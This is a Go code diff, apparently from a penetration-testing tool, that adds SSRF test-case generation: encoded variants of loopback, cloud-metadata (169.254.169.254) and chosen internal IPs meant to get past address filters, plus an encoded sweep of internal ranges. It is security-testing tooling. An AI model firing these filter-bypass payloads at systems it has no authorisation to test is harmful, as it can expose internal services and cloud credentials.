@@ -4,6 +4,8 @@ import (
 	"fmt"
 	"io/fs"
 	"strings"
+
+	"github.com/dripentest/postern/internal/ipenc"
 )
 
 type Params struct {
@@ -15,6 +17,7 @@ type Params struct {
 	ScanHosts []string
 	Ports     []int
 	Rebind    []string
+	SweepEnc  []string
 }
 
 type OOB interface {
@@ -34,6 +37,7 @@ type Case struct {
 	Param   string
 	OOB     string
 	Label   string
+	Tag     string
 }
 
 var ssrfFiles = []string{"ssrf-targets.txt", "metadata.txt", "schemes.txt", "redirect-rebind.txt"}
@@ -62,7 +66,26 @@ func SSRF(fsys fs.FS, p Params, o OOB) ([]Case, error) {
 			cases = append(cases, Case{ID: id, Mode: "ssrf", Source: fname, Payload: val, OOB: oobHost, Label: val})
 		}
 	}
+	// IP-encoding bypasses, generated for the target IPs (adaptive, tagged by kind).
+	for _, tip := range encodeTargets(p.TARGET) {
+		for _, r := range ipenc.Encode(tip) {
+			id := fmt.Sprintf("s%04d", n)
+			n++
+			val := "http://" + r.Value
+			cases = append(cases, Case{ID: id, Mode: "ssrf", Source: "ipenc", Payload: val, Label: val, Tag: r.Kind})
+		}
+	}
+	// Sweep: plain, or (with -sweep-encode) each IP in the requested encodings.
 	for _, ip := range sweepIPs(p.Sweep) {
+		if len(p.SweepEnc) > 0 {
+			for _, r := range ipenc.EncodeKinds(ip, p.SweepEnc) {
+				id := fmt.Sprintf("s%04d", n)
+				n++
+				val := "http://" + r.Value
+				cases = append(cases, Case{ID: id, Mode: "ssrf", Source: "sweep", Payload: val, Label: val, Tag: r.Kind})
+			}
+			continue
+		}
 		id := fmt.Sprintf("s%04d", n)
 		n++
 		val := "http://" + ip
@@ -157,6 +180,22 @@ func scanCases(p Params) []Case {
 		}
 	}
 	return cases
+}
+
+// encodeTargets is the set of internal IPs whose encodings we generate: loopback
+// and cloud-metadata by default, plus -itarget when it differs.
+func encodeTargets(target string) []string {
+	out := []string{"127.0.0.1", "169.254.169.254"}
+	target = strings.TrimSpace(target)
+	if target != "" {
+		for _, e := range out {
+			if e == target {
+				return out
+			}
+		}
+		out = append(out, target)
+	}
+	return out
 }
 
 func sweepIPs(bases []string) []string {
